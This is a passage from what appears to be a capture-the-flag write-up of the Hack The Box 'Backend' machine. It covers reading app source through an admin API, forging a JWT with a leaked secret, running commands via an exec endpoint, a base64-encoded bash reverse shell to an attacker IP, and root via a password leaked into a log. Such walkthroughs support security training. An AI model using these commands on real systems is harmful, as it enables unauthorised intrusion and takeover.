oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/main.py"}' | jq -r '.file'
import asyncio
                                                                                                                                        
from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
...[snip]...

```

#### Source Analysis

The various “default” endpoints are defined in this file. For example:

```

@app.get("/api", status_code=200)
def list_versions():
    """
    Versions
    """
    return {"endpoints":["v1"]}

```

The `user` and `admin` routes are not, they are imported here:

```

app.include_router(api_router, prefix=settings.API_V1_STR)

```

`api_router` is imported at the top:

```

from app.api.v1.api import api_router                     

```

When I import like this, it could be importing the entire `api_router.py` file from `app/api/v1/api`, or it could be that `api_router` is an object defined in `app/api/v1/api.py`. I’ll find it at `/home/htb/uhc/app/api/v1/api.py`:

```

from fastapi import APIRouter

from app.api.v1.endpoints import user, admin

api_router = APIRouter()
api_router.include_router(user.router, prefix="/user", tags=["user"])
api_router.include_router(admin.router, prefix="/admin", tags=["admin"])

```

This time the import is getting entire files. I can read `user.py` and `admin.py` from `/home/htb/uhc/app/api/v1/endpoints/`.

The function I’m most interested in is `exec`, which is in `admin.py`:

```

@router.get("/exec/{command}", status_code=200)
def run_command(
    command: str,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> str:
    """
    Executes a command. Requires Debug Permissions.
    """
    if "debug" not in current_user.keys():
        raise HTTPException(status_code=400, detail="Debug key missing from JWT")

    import subprocess

    return subprocess.run(["/bin/sh","-c",command], stdout=subprocess.PIPE).stdout.strip()

```

The `current_user` object is loaded from `deps.parse_token`. `deps` is imported at the top of the file:

```

from app.api import deps 

```

I’ll find the `parse_token` function in `/home/htb/uhc/app/api/deps.py`:

```

async def parse_token(
    token: str = Depends(oauth2_scheme)
) -> User:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(
            token,
            settings.JWT_SECRET,
            algorithms=[settings.ALGORITHM],
            options={"verify_aud": False},
        )

    except JWTError:
        raise credentials_exception
        
    return payload

```

It’s getting the JWT, decoding it, and returning a dictionary.

#### Forge Cookie

With all the analysis above, it’s clear that to get debug privilieges, I just need to have a valid JWT with `debug` as a key (and any value). When the token is passed to `jwt.decode` above, the secret is in `settings.JWT_SECRET`, and `settings` is imported here:

```

from app.core.config import settings      

```

Fetching `/home/htb/uhc/app/core/config.py` includes the key and the algorithm:

```

    JWT_SECRET: str = "SuperSecretSigningKey-HTB"
    ALGORITHM: str = "HS256"

```

My preferred way to forge JWT tokens is with the PyJWT library in a Python terminal. I’ll drop in and save my strings to variables:

```

oxdf@hacky$ python3
Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU"
>>> secret = "SuperSecretSigningKey-HTB"

```

Now I can get the decoded cookie:

```

>>> decoded = jwt.decode(token, secret, ["HS256"])
>>> decoded
{'type': 'access_token', 'exp': 1650419544, 'iat': 1649728344, 'sub': '1', 'is_superuser': True, 'guid': '36c2e94a-4271-4259-93bf-c96ad5948284'}

```

I’ll add the `debug` parameter to the data, and re-encode:

```

>>> decoded["debug"] = True
>>> jwt.encode(decoded, secret, "HS256")
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.-Lm7PBveaoEM5F46H5KWETGixBj1hp4_UNppFLFozDo'

```

#### Run Command

I’ll go into the docs and execute `exec`, knowing it’ll fail, but I can grab the `curl` command from there. I’ll paste that into a new terminal, replacing the token with the new forged one (and clean it up a bit, and use `jq -r .` to make the result print nicely), and it works:

```

oxdf@hacky$ curl -s http://10.10.11.161/api/v1/admin/exec/id -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.-Lm7PBveaoEM5F46H5KWETGixBj1hp4_UNppFLFozDo' | jq -r .
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)

```

### Shell

I can’t have a `/` in my command or it will go to another endpoint, so the safest thing to do is just base64-encode a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ echo 'bash -c "bash  -i >& /dev/tcp/10.10.14.6/443 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK

```

Next I’ll take the command and replace the spaces with `%20`, and there are no other special characters, so I can submit like this:

```

oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64%20-d|bash' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.-Lm7PBveaoEM5F46H5KWETGixBj1hp4_UNppFLFozDo'

```

When I do, there’s a connection at a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.161 35776
bash: cannot set terminal process group (672): Inappropriate ioctl for device
bash: no job control in this shell
htb@Backend:~/uhc$ 

```

I’ll upgrade the shell using the standard script trick:

```

htb@Backend:~/uhc$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
htb@Backend:~/uhc$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo;fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
htb@Backend:~/uhc$

```

## Shell as root

### Enumeration

The `uhc` directory is mostly set up for the application, but there’s also an `auth.log` file:

```

htb@Backend:~/uhc$ ls
__pycache__  app         poetry.lock      pyproject.toml    uhc.db
alembic      auth.log    populateauth.py  requirements.txt
alembic.ini  builddb.sh  prestart.sh      run.sh

```

Looking at it, my activity appears at the bottom, but also, there’s a bunch of admin logins, along with a single failure:

```

htb@Backend:~/uhc$ cat auth.log 
04/11/2022, 21:11:25 - Login Success for admin@htb.local
04/11/2022, 21:14:45 - Login Success for admin@htb.local
04/11/2022, 21:28:05 - Login Success for admin@htb.local
04/11/2022, 21:31:25 - Login Success for admin@htb.local
04/11/2022, 21:36:25 - Login Success for admin@htb.local
04/11/2022, 21:39:45 - Login Success for admin@htb.local
04/11/2022, 21:53:05 - Login Success for admin@htb.local
04/11/2022, 22:01:25 - Login Success for admin@htb.local
04/11/2022, 22:03:05 - Login Success for admin@htb.local
04/11/2022, 22:09:45 - Login Success for admin@htb.local
04/11/2022, 22:18:05 - Login Failure for Tr0ub4dor&3
04/11/2022, 22:19:40 - Login Success for admin@htb.local
04/11/2022, 22:19:45 - Login Success for admin@htb.local
04/11/2022, 22:20:05 - Login Success for admin@htb.local
04/11/2022, 22:21:25 - Login Success for admin@htb.local
04/11/2022, 22:26:25 - Login Success for admin@htb.local
04/11/2022, 22:33:05 - Login Success for admin@htb.local
04/11/2022, 22:55:27 - Login Success for root@ippsec.rocks
04/11/2022, 22:58:12 - Login Success for root@ippsec.rocks
04/11/2022, 22:59:30 - Login Success for admin@htb.local
04/12/2022, 00:04:02 - Login Failure for 0xdf@htb.htb
04/12/2022, 00:04:32 - Login Failure for 0xdf
04/12/2022, 00:04:45 - Login Failure for 0xdf@htb.htb
04/12/2022, 00:05:30 - Login Success for 0xdf@htb.htb
04/12/2022, 01:15:16 - Login Success for 0xdf@htb.htb
04/12/2022, 01:51:06 - Login Success for admin@htb.local
04/12/2022, 01:52:23 - Login Success for admin@htb.local

```

“Tr0ub4dor&3” doesn’t look like a valid username (all the others are emails, except for some of my failures). Its possible that the admin put their password in instead of the username one time.

### su

That does in fact work as the root password:

```

htb@Backend:~/uhc$ su -
Password: 
root@Backend:~#

```

And I can read `root.txt`:

```

root@Backend:~# cat root.txt
73a98d05************************

```